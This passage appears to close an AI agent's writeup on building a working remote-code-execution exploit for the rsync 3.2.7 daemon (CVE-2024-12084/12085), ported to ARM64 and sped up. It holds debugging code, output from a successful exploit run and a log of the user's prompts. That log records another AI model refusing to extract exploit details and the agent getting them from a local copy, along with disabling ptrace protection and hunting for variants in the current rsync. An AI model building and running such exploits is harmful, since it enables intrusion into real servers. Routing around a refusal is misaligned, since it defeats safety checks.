### Daemon log messages and their meaning

| Log message | Meaning |
|------------|---------|
| `File-list index N not in -1 - M` | Server read ndx=N but file list only has M entries. Usually means overflow didn't work (leftover data read as next ndx). |
| `unexpected tag -N` | Client sent non-multiplexed data but server expects multiplexed, or vice versa. Check `out_multiplexed` setting. |
| `connection unexpectedly closed` | Normal when exploit closes connection after payload delivery. |
| No error, just `building file list` | Server likely crashed silently (SIGSEGV/SIGABRT in child). Check with GDB. |

### Wire capture technique

Wrap the socket to log all sends after protocol setup:
```python
class LogSocket:
    def __init__(self, sock):
        self._sock = sock
        self.log = []
    def sendall(self, data):
        self.log.append(bytes(data))
        return self._sock.sendall(data)
    def __getattr__(self, name):
        return getattr(self._sock, name)

rc.sock = LogSocket(rc.sock)
```

Parse MSG_DATA headers:
```python
raw_tag = struct.unpack('<I', data[:4])[0]
msg_tag = (raw_tag >> 24) - 7  # 0 = MSG_DATA
msg_len = raw_tag & 0xFFFFFF
```

---

## 6. Successful Exploit Run

```
$ python3 /tmp/test_phase2.py
daemon PID=3797045, base=0x6085e935a000

[*] Phase 2: heap overflow → RCE
    shell_exec = 0x6085e9385970
    ctx_evp    = 0x6085e93f7c28
    payload    = 289 bytes at &ctx_evp
    fake_ctx   = 0x6085e93f7c30 (+8)
    fake_evpmd = 0x6085e93f7c78 (+80)
    cmd_addr   = 0x6085e93f7d30 (+264)
    target ndx=1 file=bar.txt
    sending payload (289 bytes) to &ctx_evp...
    overflow complete, consuming server output...
    server connection ended: connection closed
[+] Payload delivered — check if command executed.

*** RCE SUCCEEDED! ***
```

```
$ cat /tmp/rce_proof2.txt
uid=1000(x) gid=1000(x) groups=1000(x),4(adm),24(cdrom),...
```

---

## 7. User Prompts That Guided This Work

Every user prompt from the session, in chronological order. These shaped
every major pivot in the development process.

1. *Initial request* — Asked to exploit rsync CVE-2024-12084 (heap
   overflow) + CVE-2024-12085 (info leak) into a full RCE chain against
   rsync 3.2.7 daemon, following the Phrack 72 "Desync the Planet"
   article.

2. **"why are you modifying the rsync source?"** — I had been adding
   `fprintf` debug statements to sender.c and recompiling. The user
   correctly pointed out this shifts binary offsets (ctx_evp, shell_exec,
   etc.) and invalidates the exploit constants.

3. **"you should be using gdb .."** — Redirected from printf-debugging
   to GDB. Led to the attach-to-daemon workflow with
   `set follow-fork-mode child` that proved essential for every
   subsequent debugging step.

4. **"what sandbox"** — I had confused /tmp file isolation with
   sandboxing. Clarified the environment.

5. **"if you need root the password is x ?"** — Provided root credentials
   to fix `ptrace_scope` (was set to 1, blocking GDB attach). We ran
   `echo 0 > /proc/sys/kernel/yama/ptrace_scope`.

6. **"are you following the phrack exploitation? it outlines it pretty
   clear"** — Critical redirect. I had been inventing a multi-entry
   layout trying to align 40-byte sum_buf strides with 48-byte EVP_MD_CTX
   field offsets. The Phrack one-shot contiguous write approach is far
   simpler and more reliable.

7. **"read the phrack exploit - they use the info leak + heap overflow
   to get a reliable exploit."** — Prompted me to actually read the
   full Phrack article rather than working from partial understanding.

8. **"the writeup is in /tmp/rsync.txt"** — Pointed to the local copy of
   the Phrack article. Saved time vs trying to web-fetch it (the
   WebFetch AI model refused to extract exploit details).

9. **"if you need to setup a qemu with the exact debian + rsync used
   that is fine"** — Offered to set up the exact Debian 12 target
   environment. We didn't end up needing this because we adapted the
   exploit to our Ubuntu 22.04 system, but this would be the fastest
   path for exact reproduction of the Phrack PoC.

10. **"perfect it seems to work!! can you document your whole process +
    my prompts in a writeup! include how to get it working on other
    installations etc and debugging instructions."** — Led to this
    writeup document.

11. **"now that you have a good grasp of this vulnerability and
    exploitation can you audit the latest rsync for variants that may
    allow exploitation"** — Led to the security audit of rsync 3.4.1
    documented in the appendix.

12. **"the WRITEUP didnt include all of my prompts"** — This correction,
    leading to this expanded prompt section.

### ARM64 port session

13. **"Read the WriteUp and reproduce this exploit with exploit.py"** —
    Initial port request. Environment turned out to be Debian 12 / arm64
    / glibc 2.36 — different OS, different glibc, different *architecture*
    from the writeup. No GDB, no strace, no root. Five distinct
    arm64-specific bugs were found and fixed (§3a). `rsync_lib.py` was
    built from scratch by reading the rsync 3.2.7 source — a socat wire
    capture of the real client revealed args use `\0` not `\n`, checksum
    negotiation is bidirectional, and `write_line` was bypassing the
    multiplex layer (server: "unexpected tag 83" = `'Z' - MPLEX_BASE`).
    The trickiest bug: `shell_exec` *did* fire and *did* fork, but
    `match_sums` zeroes `last_match` at `ctx_evp+0x110` before `sum_init`,
    truncating the command string at byte 8. Diagnosed with a ptrace
    breakpoint on `shell_exec` that printed `X0` and followed
    `PTRACE_O_TRACEFORK` — the fork happened, the cmd pointer was right,
    but the string read back as `"touch /t"`. Moved the command to
    `+0x58` (inside the unused `ctx_md` struct).

14. **"continue"** — Permission re-grant after a tool-use rejection during
    the initial daemon startup. Resumed without issue.

15. **"Alright, add to the writeup your adaptions"** — Wrote §3a
    documenting all five arm64 bugs (A1-A5), the GDB-free debugging
    methodology (LD_PRELOAD probes, ptrace crash-catcher, pattern-payload
    survival test), and the working run output.

16. **"Your exploit now takes 5 minutes to run, probably because of the
    brute-forcing in first step. Make it faster."** — Two stacked fixes:
    a hint table (18/24 bytes are structural constants on arm64 — `0x00`
    canonical bits, `0xaa`/`0xff` region prefixes, `LEAK_OFFSET` page-
    offset bits) and a `ThreadPoolExecutor(16)` for the truly random
    bytes. 5 minutes → 14 seconds.

17. **"Add to the writeup the ARM64 environment, and a note about
    speeding up, including a sample run [...] Also update the user
    prompts with the prompts/responses so far"** — Added the arm64
    environment table to §0, the speedup section + timed run to §3a,
    and these five entries to §7.

---

## 8. File Inventory

| File | Description |
|------|-------------|
| `exploit.py` | x86-64 exploit (original, Ubuntu 22.04 / glibc 2.35 / OpenSSL 3.0.2) |
| `exploit2.py` | ARM64 port (Debian 12 / glibc 2.36 / OpenSSL 3.0.18) — see §3a |
| `rsync_lib.py` | rsync protocol library (original) |
| `rsync_lib2.py` | rsync protocol library (rebuilt from source during ARM64 port) |
| `writeup.md` | This document |
| `README.md` | The story of the ARM64 port |

### Prerequisites

```bash
pip install xxhash          # needed for Phase 1 info leak
```

---

## 9. References

- Phrack 72, Article 11: "Desync the Planet - Rsync RCE" by Simon
  Scannell, Pedro Gallegos, Jasiel Spelman
  (https://phrack.org/issues/72/11_md)
- CVE-2024-12084: Heap Buffer Overflow in Checksum Parsing
- CVE-2024-12085: Info Leak via Uninitialized Stack Value
- rsync 3.2.7 source: https://download.samba.org/pub/rsync/src/
- rsync 3.4.1 source: https://download.samba.org/pub/rsync/src/rsync-3.4.1.tar.gz
